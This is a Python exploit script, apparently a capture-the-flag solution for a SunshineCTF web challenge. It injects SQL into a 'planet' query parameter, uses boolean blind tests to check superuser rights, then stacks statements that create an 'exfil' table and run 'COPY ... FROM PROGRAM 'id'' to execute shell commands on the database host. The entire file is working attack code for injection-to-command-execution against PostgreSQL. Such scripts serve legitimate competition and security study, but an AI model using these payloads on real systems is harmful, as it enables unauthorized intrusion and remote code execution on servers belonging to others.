"""Command execution test through stacked COPY ... FROM PROGRAM.

The app reads the FIRST result set, so the leading `MARS' AND 1=1` keeps the page on
carrier while the statements after the semicolon do the real work. A dedicated
one-column text table is used instead of zleak so the column type is known.
"""
import sys
import time
import urllib.parse
import urllib.request

BASE = "https://planetary.web.2026.sunshinectf.games"


def probe(planet):
    url = BASE + "/probe?planet=" + urllib.parse.quote(planet, safe="")
    for _ in range(3):
        try:
            with urllib.request.urlopen(url, timeout=120) as r:
                b = r.read().decode("utf-8", "replace")
            return "carrier" if "is-carrier" in b else "null"
        except Exception as e:
            print("[!] %s, retry" % type(e).__name__, file=sys.stderr)
            time.sleep(3)
    return "ERR"


def sql(*stmts):
    """Run statements after a true predicate; returns the page state."""
    return probe("MARS' AND 1=1; " + "; ".join(stmts) + "-- -")


def bit(expr):
    for _ in range(3):
        if probe("MARS' AND (%s)-- -" % expr) == "carrier":
            return True
        time.sleep(1.5)
    return False


if __name__ == "__main__":
    print("[*] superuser?            %s" % bit("(SELECT rolsuper FROM pg_roles WHERE rolname=current_user)"), flush=True)
    print("[*] can use PROGRAM role? %s" % bit("(SELECT COUNT(*) FROM pg_roles WHERE rolsuper AND pg_has_role(current_user,oid,'MEMBER'))>0"), flush=True)
    print("[*] create exfil table    %s" % sql("CREATE TABLE IF NOT EXISTS exfil(line text)"), flush=True)
    time.sleep(2)
    print("[*] table exists          %s" % bit("(SELECT COUNT(*) FROM pg_tables WHERE tablename='exfil')>0"), flush=True)
    print("[*] COPY FROM PROGRAM id  %s" % sql("COPY exfil FROM PROGRAM 'id'"), flush=True)
    time.sleep(2)
    print("[*] exfil has a row       %s" % bit("(SELECT COUNT(*) FROM exfil)>0"), flush=True)
    print("[*] row looks like id out %s" % bit("(SELECT COUNT(*) FROM exfil WHERE exfil::text LIKE '%uid=%')>0"), flush=True)
